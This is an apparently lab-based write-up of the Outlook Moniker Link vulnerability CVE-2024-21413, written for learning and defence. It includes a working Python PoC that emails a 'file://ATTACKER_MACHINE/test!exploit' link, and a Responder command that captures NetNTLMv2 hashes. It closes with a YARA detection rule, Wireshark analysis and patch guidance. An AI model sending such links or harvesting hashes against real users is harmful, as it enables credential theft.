# CVE-2024-21413 — Microsoft Outlook (Moniker Link) – RCE & Credential Leak

## Overview (Easy English)
- Announced: **February 13, 2024**
- Discovered by: **Haifei Li (Check Point Research)**
- What is it? A bug in **Microsoft Outlook** where a special hyperlink (a **Moniker Link**) can bypass security and make Outlook send your **NTLM credentials** to an attacker when you click it.
- Impact: **Credential Leak** (NetNTLMv2 hash) and possible **Remote Code Execution (RCE)**
- Severity: **Critical (CVSS 9.8)**



## CVSS / Reference
| Field | Info |
|------|------|
| Publish date | February 13, 2024 |
| MS article | https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413 |
| Impact | Remote Code Execution & Credential Leak |
| Severity | Critical |
| Attack Complexity | Low |
| Scoring | 9.8 |



## Affected Office Releases
| Release | Version |
|---|---|
| Microsoft Office LTSC 2021 | affected from 19.0.0 |
| Microsoft 365 Apps for Enterprise | affected from 16.0.1 |
| Microsoft Office 2019 | affected from 16.0.1 |
| Microsoft Office 2016 | affected from 16.0.0 before 16.0.5435.1001 |



## How Outlook Normally Handles Links
- Outlook can show **HTML emails** and parse links like **http://**, **https://**.
- Outlook can also open **Moniker Links** (special URLs that can trigger apps, like file://).
- When an external app would open, **Protected View** shows a **security prompt** and blocks risky actions.
<img width="448" height="286" alt="Screenshot 2025-08-17 at 6 57 12 PM" src="https://github.com/user-attachments/assets/6ddba736-be7d-426b-90d4-60071d1db111" />

Example (normally blocked by Protected View):
```html
<a href="file://ATTACKER_MACHINE/test">Click me</a>
```
## The Bypass (Why This CVE Matters)
- If the link includes a ! in the file:// Moniker Link, Outlook’s Protected View can be bypassed.
- Then Outlook tries to access the remote path over SMB, sending the victim’s NetNTLMv2 credentials.

**Malicious example (bypasses protection):**
``` bash
<a href="file://ATTACKER_MACHINE/test!exploit">Click me</a>
```
**Notes:**
- The remote share does not need to exist. An authentication attempt still happens.
- That attempt leaks the Windows NetNTLMv2 hash to the attacker’s SMB listener.
## Why People Mention RCE

- Moniker Links use COM (Component Object Model) under the hood.
- That opens a path to RCE in theory; however, there is no public PoC for RCE specifically for this CVE at the time described.
- The credential leak vector is the more concrete, widely discussed impact.
## Quick Summary (TL;DR)
- Outlook supports Moniker Links like file://....
- Protected View should block risky external triggers.
- Adding ! in the file:// link can bypass that protection.
- Clicking the link makes Outlook try SMB auth and leak NetNTLMv2 credentials.
- Severity is Critical (9.8); treat and patch accordingly.
---
# CVE-2024-21413 — Outlook Moniker Link Exploit 

## Simple Explanation
This attack shows how an attacker can send a **malicious email** with a **Moniker Link** to a victim.  
When the victim clicks the link in Outlook, their computer will **try to access a file from the attacker’s machine**, and in doing so, their **netNTLMv2 hash (credentials)** gets leaked to the attacker.



## Steps in the Attack

### 1. Sending the Malicious Email
- We write a small **Python script** to send an email.
- The email contains a **Moniker Link** like:
file://ATTACKER_MACHINE/test!exploit
- The `!exploit` part is what **bypasses Outlook’s Protected View**.
- When the victim clicks, Outlook tries to connect to the attacker’s machine over **SMB** and leaks credentials.

### Example PoC Script (exploit.py)
```python
'''
Author: CMNatic | https://github.com/cmnatic
Version: 1.0 | 19/02/2024
'''

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr

sender_email = 'attacker@monikerlink.thm'
receiver_email = 'victim@monikerlink.thm'
password = input("Enter your attacker email password: ")

html_content = """\
<!DOCTYPE html>
<html lang="en">
  <p><a href="file://ATTACKER_MACHINE/test!exploit">Click me</a></p>
</html>"""

message = MIMEMultipart()
message['Subject'] = "CVE-2024-21413"
message["From"] = formataddr(('CMNatic', sender_email))
message["To"] = receiver_email

msgHtml = MIMEText(html_content,'html')
message.attach(msgHtml)

server = smtplib.SMTP('MAILSERVER', 25)
server.ehlo()
try:
  server.login(sender_email, password)
except Exception as err:
  print(err)
  exit(-1)

try:
  server.sendmail(sender_email, [receiver_email], message.as_string())
  print("\n Email delivered")
except Exception as error:
  print(error)
finally:
  server.quit()
```

### 2. What the Script Does
- Takes attacker and victim email addresses.
- Asks for attacker’s email password.
- Puts the malicious Moniker Link in the email body.
- Sets subject, sender, and receiver.
- Connects to a mail server and sends the crafted email.
### 3. Setting Up the Attacker Machine
The attacker now sets up a listener to capture hashes.

For example, using Responder:
``` bash
responder -I ens5
```
- Here, ens5 is the network interface (it may differ on your machine).
- Responder will wait for SMB/NTLM authentication attempts.
<img width="1240" height="431" alt="Screenshot 2025-08-17 at 6 58 29 PM" src="https://github.com/user-attachments/assets/3d735dbc-ee82-4225-acd7-34429cfbc7f6" />
### 4. Python's Script
- When prompted for the attacker's email password, enter "attacker".

``` bash
root@attackbox:# python3 exploit.py
```
- Enter your attacker email password: attacker
- The Python script will print "Email delivered" when the email has been sent.
- If the script complains about authentication failure, ensure you have correctly replaced the values in exploit.py.
- Now, let's return to the vulnerable machine and check for the new email:

### 4. Victim’s Outlook
- Victim opens Outlook (already configured mailbox).
- They see the new email with subject CVE-2024-21413.
- They click the "Click me" link.
<img width="736" height="694" alt="Screenshot 2025-08-17 at 7 02 08 PM" src="https://github.com/user-attachments/assets/a91d88bf-8edd-4327-80a7-06dcce94f048" />
### 5. Capture of Credentials
- Outlook tries to load the file from file://ATTACKER_MACHINE/test!exploit.
- This forces SMB authentication, sending netNTLMv2 hash to the attacker.
- On the attacker’s terminal, Responder shows the captured hash.
<img width="776" height="372" alt="Screenshot 2025-08-17 at 7 02 51 PM" src="https://github.com/user-attachments/assets/47f1d4eb-4a07-4e6d-82e1-2b4509e11661" />

## Key Points to Remember
- Normal file:// links are blocked by Outlook’s Protected View.
- Adding !exploit bypasses this protection.
- Victim’s credentials (hash) are leaked even if the file/share does not exist.
- This is why the vulnerability is critical (CVSS 9.8).
## Quick Recap
- Create malicious email → insert Moniker Link with !.
- Send email to victim via Python script.
- Run Responder on attacker machine.
- Victim clicks link → Outlook leaks netNTLMv2 hash.
- Attacker now has victim’s credentials.
---
# YARA & Wireshark Analysis for CVE-2024-21413 (Outlook RCE)

## 1. YARA Rule
YARA rules are used to **detect malicious patterns** inside files, emails, or memory.  
Here, a **YARA rule created by Florian Roth** is used to detect emails that try to exploit **CVE-2024-21413**.

### Example YARA Rule
```yara
rule EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24 {
   meta:
      description = "Detects emails that contain signs of a method to exploit CVE-2024-21413 in Microsoft Outlook"
      author = "X__Junior, Florian Roth"
      reference = "https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability/"
      date = "2024-02-17"
      modified = "2024-02-19"
      score = 75

   strings:
      $a1 = "Subject: "
      $a2 = "Received: "
      $xr1 = /file:\/\/\/\\\\[^"']{6,600}\.(docx|txt|pdf|xlsx|pptx|odt|jpg|png|gif|bmp|tiff|svg|mp4|avi|mov|wmv|flv|mkv|mp3|wav|aac|flac|ogg|wma|exe|msi|bat|cmd|ps1|zip|rar|7z|targz|iso|dll|sys|ini|cfg|reg|html|css|java|py|c|cpp|db|sql|mdb|accdb|sqlite|eml|pst|ost|mbox|htm|php|asp|jsp|xml|ttf|otf|woff|woff2|rtf|chm|hta|js|lnk|vbe|vbs|wsf|xls|xlsm|xltm|xlt|doc|docm|dot|dotm)!/

   condition:
      filesize < 1000KB
      and all of ($a*)
      and 1 of ($xr*)
}
```

## What the YARA Rule Does
The YARA rule is like a **security guard** that checks emails for suspicious content.

### Sections in the Rule:
- **Meta Section** → Basic info like author, date, reference.
- **Strings Section** →  
  - Looks for `"Subject:"` and `"Received:"` (normal email headers).  
  - Uses a **regex** to detect `file://` links that point to risky files (e.g. `.docx`, `.exe`, `.zip`, `.js`, etc.).
- **Condition Section** →  
  - Works only on files smaller than **1000 KB**.  
  - Needs both `"Subject:"` and `"Received:"`.  
  - At least one suspicious link (`file://`) must be present.  

✅ **In short:** This rule helps catch **emails with dangerous Moniker Links**.



## 2. Wireshark Analysis
When a victim clicks on the **Moniker Link** in Outlook:

- Outlook tries to open a file from the attacker’s machine using **SMB protocol**.  
- While doing this, the victim’s **netNTLMv2 hash** gets leaked.

### What Wireshark Shows:
- An **SMB authentication request** sent by victim → attacker.  
- Inside that request, a **truncated netNTLMv2 hash** is visible.  
- This confirms the exploit is working.
<img width="1079" height="552" alt="Screenshot 2025-08-17 at 7 03 25 PM" src="https://github.com/user-attachments/assets/a0eecd95-96f4-4ff4-add5-8f8d366186d3" />



## 3. Microsoft Patch
- Microsoft fixed this issue in **February 2024 Patch Tuesday** updates.  
- Works across different Outlook versions.  
- To stay safe → **Update Office** using:
  - **Windows Update**  
  - **Microsoft Update Catalog**



## 4. Cybersecurity Best Practices
Even after applying patches, users should stay alert.

| Bad Practice ❌ | Safe Practice ✅ |
|----------------|------------------|
| Clicking random links in emails | Do **not click unknown links** |
| Opening attachments blindly | **Preview links/attachments first** |
| Ignoring suspicious emails | **Report/forward to Security Team** |



## 5. Quick Recap
- YARA rule = Detects **malicious Moniker Links** in emails.  
- Wireshark = Shows **SMB request** + leaked **netNTLMv2 hash**.  
- Microsoft = Released patch in **Feb 2024**.  
- Users = Must follow **safe email habits** to reduce risks.  

---
